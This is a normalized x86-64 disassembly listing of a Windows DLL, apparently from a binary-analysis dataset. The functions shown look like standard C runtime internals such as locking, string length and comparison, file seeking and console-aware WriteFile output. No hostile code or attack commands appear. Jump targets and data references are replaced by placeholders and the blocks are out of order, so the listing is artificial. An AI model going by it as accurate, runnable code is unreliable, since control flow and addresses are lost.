test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_18000e298
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_18000e22c
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_18000be60
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_180008d64
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_18000e210
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_18000e22c
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_18000e0b8
test eax eax
jne r-xdata
mov rcx r13
call sub_18000e210
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_18000e140
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008d64
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008d64
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_18000e0b8
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008d64
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008d64
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_18000deb0
jmp r-xdata
sub_18000b7d0
sub rsp 0x28
mov ecx 0x3
call sub_18000e298
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_18000b570
mov ecx 0xff
call sub_18000b570
mov ecx 0x3
call sub_18000e298
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_18000b81c
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_18000a4e0
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_18000a4e0
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_18000b924
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_18000c3c4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_18000b988
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_18000c3c4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_18000b9bc
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_18000c2c4
sub_18000bacc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_18000e430
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_180006f24
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_18000e430
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_18000e430
mov ecx 0x1
mov rbx rax
call sub_18000e430
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18000e384
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_18000bb88
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_18000e4a4
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_180006ee4
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_18000bacc
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_18000e54c
mov eax edi
jmp r-xdata
sub_18000bc4c
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_180006da4
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_18000bc84
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_18000baa4
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18000cd20
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_18000bd00
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_18000bc84
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_18000bd4c
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_18000baa4
mov ecx eax
call sub_18000e574
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000bd4c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_18000c3c4
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_18000c2c4
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_18000b988
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_18000ba08
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_18000bd00
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_18000bd00
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_18000be60
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_18000bf08
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_18000643c
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000bf50
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000643c
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000bf98
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_18000643c
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_18000bf08
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_18000d23c
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18000c080
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_18000c3c4
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_18000c2c4
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_180006da4
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_180006da4
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_18000c100
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18000c1b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_18000c23c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_180006da4
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_18000c2dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_18000b7d0
lea ecx [ rsi + 0x1d ]
call sub_18000b570
mov ecx 0xff
call sub_18000a628
mov ecx 0x28
call sub_18000a460
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_18000c3c4
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_180006ee4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_180006da4
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_180006da4
call sub_180006ee4
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_18000c3c4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_18000c2dc
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_18000a968
sub_18000c408
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_18000c444
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_18000e430
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_180006ee4
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_180006f24
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_18000c4dc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18000e4a4
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180006f04
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_18000c444
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_18000e54c
mov rax rbx
jmp r-xdata
sub_18000c5c0
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_18000a210
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_180006f04
and [ rax ] edi
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_18000ce54
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_18000c444
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_180007a4c
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_180006ee4
mov [ rax ] 0x1c
call sub_180006f04
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_180006f24
jmp r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180006f04
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_18000bf50
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
